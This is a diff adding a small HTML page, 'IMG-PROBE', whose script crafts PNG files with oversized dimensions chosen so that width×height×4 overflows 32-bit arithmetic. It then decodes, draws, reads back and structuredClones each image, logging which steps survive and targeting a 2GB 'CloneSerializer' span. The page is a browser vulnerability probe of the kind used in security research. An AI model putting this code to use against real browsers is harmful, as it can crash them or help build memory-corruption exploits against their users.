@@ -1,0 +1,47 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>IMG-PROBE</title>
+<body style="background:#000;color:#0f0;font:14px monospace;white-space:pre-wrap;margin:10px">
+<div id=o>[IMG-PROBE] decoder dimension overflow -> CloneSerializer 2GB span</div>
+<script>
+const o=document.getElementById('o');
+const log=m=>o.textContent+="\n"+m;
+window.addEventListener('error',e=>log("[ERROR] "+e.message));
+log("[*] start");
+
+function crc32(buf){let t=[];for(let n=0;n<256;n++){let c=n;for(let k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c>>>0;}let c=0xFFFFFFFF;for(let i=0;i<buf.length;i++)c=t[(c^buf[i])&0xFF]^(c>>>8);return (c^0xFFFFFFFF)>>>0;}
+function u32(n){return [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255];}
+function chunk(type,data){const len=u32(data.length);const td=[...type.split("").map(c=>c.charCodeAt(0)),...data];const c=u32(crc32(td));return[...len,...td,...c];}
+function png(w,h){
+  const ihdr=[...u32(w),...u32(h),8,6,0,0,0]; // 8-bit RGBA
+  const ihdrC=chunk("IHDR",ihdr);
+  const idat=[0x78,0x9C,0x63,0x60,0x60,0x60,0x00,0x00,0x00,0x04,0x00,0x01]; // 1 black row, zlib
+  const idatC=chunk("IDAT",idat);
+  const iendC=chunk("IEND",[]);
+  const sig=[137,80,78,71,13,10,26,10];
+  return new Uint8Array([...sig,...ihdrC,...idatC,...iendC]);
+}
+async function testImg(tag,w,h){
+  try{
+    const blob=new Blob([png(w,h)],{type:"image/png"});
+    const bmp=await createImageBitmap(blob);
+    log(tag+": bitmap "+bmp.width+"x"+bmp.height);
+    const c=document.createElement("canvas");c.width=bmp.width;c.height=bmp.height;
+    const x=c.getContext("2d");x.drawImage(bmp,0,0);
+    log(tag+": drawn, claiming "+(bmp.width*bmp.height*4)+" bytes (0x"+(bmp.width*bmp.height*4>>>0).toString(16)+")");
+    const d=x.getImageData(0,0,Math.min(bmp.width,64),Math.min(bmp.height,64));
+    log(tag+": getImageData ok, data.len="+d.data.length);
+    try{ const s=structuredClone(d.data); log(tag+": clone SURVIVED "+s.byteLength); }
+    catch(e){ log(tag+": clone "+e.name); }
+  }catch(e){log(tag+": "+e.name+" "+(e.message||"").slice(0,60));}
+}
+(async()=>{
+  // overflow combos: w*h*4 wraps in 32-bit
+  await testImg("16384x16384",16384,16384);       // w*h*4 = 0x40000000 (1GB)
+  await testImg("32768x16384",32768,16384);       // = 0x80000000 (2GB) <- target span
+  await testImg("46341x46341",46341,46341);       // w*h ≈ 2^31, *4 overflows to ~0
+  await testImg("65536x65536",65536,65536);       // w*h = 2^32 -> *4 wraps to 0
+  await testImg("0x8000x0x10000",0x8000,0x10000);// *4 wraps to 0
+  log("DONE");
+})();
+</script>
